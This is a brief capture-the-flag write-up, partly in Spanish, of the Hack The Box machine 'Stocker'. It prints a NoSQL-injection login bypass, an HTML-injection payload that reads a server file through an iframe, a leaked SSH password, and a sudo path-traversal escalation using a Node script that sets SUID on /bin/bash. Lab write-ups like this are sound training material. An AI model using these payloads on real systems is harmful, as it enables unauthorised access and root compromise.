# Writeup - Stocker Linux Easy


ping -c 1 10.10.11.196 -R
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.196 -oG allPorts
nmap -sCV -p22, 80 10.10.11.196 -oN targetedPorts
gobuster dir -u http://stocker.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
gobuster for subdomains

exploiting nosql injection:

Updated Request

If you want to try sending the payload as JSON, update the Content-Type and ensure the server accepts JSON input:
```json
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 75
Origin: http://dev.stocker.htb
Connection: keep-alive
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AeE6WpibBs4gMiv-vhTnFG70k72Nyff3O.aoVHyLeUmoDHJ2vttbUNuIty36zOOk3p68C%2BdukR6gw
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{
        "username":{
                "$ne":"test"
        },
        "password":{
                "$ne":"test"
        }
}
```

Leaking the password via figuring out it's route index.js

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Content-Length: 383
Origin: http://dev.stocker.htb
Connection: keep-alive
Cookie: connect.sid=s%3AeE6WpibBs4gMiv-vhTnFG70k72Nyff3O.aoVHyLeUmoDHJ2vttbUNuIty36zOOk3p68C%2BdukR6gw
Priority: u=0

{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "<img src=\"xasdasdasd\" onerror=\"document.write('<iframe src=file:///var/www/dev/index.js height=100% width=100%></iframe>')\"/>",
      "description": "It's a red cup.",
      "image": "red-cup.jpg",
      "price": 32,
      "currentStock": 4,
      "__v": 0,
      "amount": 1
    }
  ]
}
```

una vez siendo user connectacndonos por ssh angoose@stocker.htb password: IHeardPassphrasesArePrettySecure
id
sudo -l
cd /root/

tenemos privilegio de ejecutar 
usr/bin/node usr/local/scripts/*js
el *js nos permite hacer un ../../../tmp/malicious.js
creamos un malicious.js en /tmp/
```js
const { exec } = require("child_process");

exec("chmod u+s /bin/bash", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
```

hacemos sudo usr/bin/node /usr/local/scripts/../../../tmp/malicious.js
y un bash -p y somos root.

